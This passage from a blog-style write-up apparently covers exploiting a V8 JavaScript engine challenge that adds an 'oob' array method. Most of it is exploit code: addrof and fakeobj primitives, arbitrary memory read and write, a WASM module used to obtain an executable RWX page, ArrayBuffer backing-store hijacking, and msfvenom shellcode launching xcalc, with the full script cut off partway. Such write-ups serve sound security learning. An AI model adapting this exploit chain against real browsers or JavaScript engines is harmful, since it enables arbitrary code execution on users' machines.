</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">rwx_page_addr</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="nx">n</span><span class="o">+</span><span class="mh">0x88</span><span class="nx">n</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>we can find what the <code>wasm_code</code> value should be by using <a href="https://wasdk.github.io/WasmFiddle">WasmFiddle</a> and finding out the code buffer of a minimal function in <code>C</code>. This would force v8 to allocate a <code>RWX page</code> to hold the <code>WASM</code> instance :</p>
<p><code>C code</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>WASM code</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">(module
</span></span><span class="line"><span class="cl"> (table 0 anyfunc)
</span></span><span class="line"><span class="cl"> (memory $0 1)
</span></span><span class="line"><span class="cl"> (export &#34;memory&#34; (memory $0))
</span></span><span class="line"><span class="cl"> (export &#34;main&#34; (func $main))
</span></span><span class="line"><span class="cl"> (func $main (; 0 ;) (result i32)
</span></span><span class="line"><span class="cl">  (i32.const 0)
</span></span><span class="line"><span class="cl"> )
</span></span><span class="line"><span class="cl">)
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>Code buffer</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasmCode</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">	<span class="p">[</span>
</span></span><span class="line"><span class="cl">		<span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span>
</span></span><span class="line"><span class="cl">	<span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The only thing left to do is to write a function to copy our custom shellcode into this <code>RWX</code> page . We can do this by using the <code>ArrayBuffer</code> and <code>DataView</code> objects technique described earlier as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">let</span> <span class="nx">buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">let</span> <span class="nx">backing_store_addr</span> <span class="o">=</span> <span class="nx">buf_addr</span> <span class="o">+</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">initial_arb_write</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="nx">i</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// msfvenom -p linux/x64/exec CMD=&#39;xcalc&#39; --format dword
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">shellcode</span><span class="o">=</span><span class="p">[</span>					
</span></span><span class="line"><span class="cl">		<span class="mh">0x90909090</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x90909090</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x782fb848</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x636c6163</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x48500000</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x73752fb8</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x69622f72</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x8948506e</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0xc03148e7</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x89485750</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0xd23148e6</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x3ac0c748</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x50000030</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x4944b848</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x414c5053</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x48503d59</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x3148e289</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x485250c0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0xc748e289</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x00003bc0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x050f00</span>
</span></span><span class="line"><span class="cl"><span class="p">];</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>As is probably obvious at this point, we need to change the <code>ArrayBuffer</code>&rsquo;s <code>backing store</code> to point to the <code>rwx_page_addr</code>. The way we can find the location of the <code>ArrayBuffer</code> backing store is as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">				+-----------------+           +-----------------+
</span></span><span class="line"><span class="cl">				|  ArrayBuffer    |     +----&gt;|  RWX PAGE       |
</span></span><span class="line"><span class="cl">				|                 |     |     |                 |
</span></span><span class="line"><span class="cl">				| 0x0:  map       |     |     |                 |
</span></span><span class="line"><span class="cl">				| 0x8:  properties|     |     |                 |
</span></span><span class="line"><span class="cl">				| 0x10: elements  |     |     |                 |
</span></span><span class="line"><span class="cl">				| 0x18: byteLength|     |     |                 |
</span></span><span class="line"><span class="cl">				| 0x20: backingStore ---+     |                 |
</span></span><span class="line"><span class="cl">				| 0x24: flags     |           |                 |
</span></span><span class="line"><span class="cl">				+-----------------+           +-----------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>Following is the whole exploit script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">/// Helper functions to convert between float and integer primitives
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// 8 byte array buffer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// typeof(val) = float
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="c1">// Watch for little endianness
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// typeof(val) = BigInt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">fl_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">fl_arr_map</span> <span class="o">=</span> <span class="nx">fl_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">tmp_obj</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">obj_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">tmp_obj</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">obj_arr_map</span> <span class="o">=</span> <span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">in_obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// setting the object we want the address of as an element of obj_arr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">in_obj</span><span class="p">;</span> 	
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// oob write. changing the map of obj_arr for the fl_arr map.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">fl_arr_map</span><span class="p">);</span> 	
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// even though we are accesing obj_arr, the returned element will be a float
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">let</span> <span class="nx">addr</span> <span class="o">=</span> <span class="nx">obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>	
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// oob write. restoring the map of the object for the original one
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">obj_arr_map</span><span class="p">);</span>	
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// returning the integer representation of the leaked pointer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>	
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// storing the float value of an arbitrary address as an element of fl_arr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">fl_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// oob write. replacing the map of the fl_arr to that of the obj_arr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">fl_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">obj_arr_map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// even though we are accessing fl_arr, the retur&lt;F3&gt;ned element will be a tagged pointer.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fl_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// oob write. restoring original map of fl_arr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">fl_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">fl_arr_map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// returning tagged pointer of arbitrary address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">return</span> <span class="nx">fake</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">arb_rw_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">fl_arr_map</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// We have to use tagged pointers for reading, so we tag the addr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">%</span> <span class="mi">2</span><span class="nx">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">addr</span> <span class="o">+=</span> <span class="mi">1</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Place a fakeobj right on top of our crafted array with a float array map
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arb_rw_arr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Change the elements pointer using our crafted array to read_addr-0x10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">arb_rw_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Index 0 will then return the value at read_addr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">initial_arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Place a fakeobj right on top of our crafted array with a float array map
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arb_rw_arr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Change the elements pointer using our crafted array to write_addr-0x10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">arb_rw_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
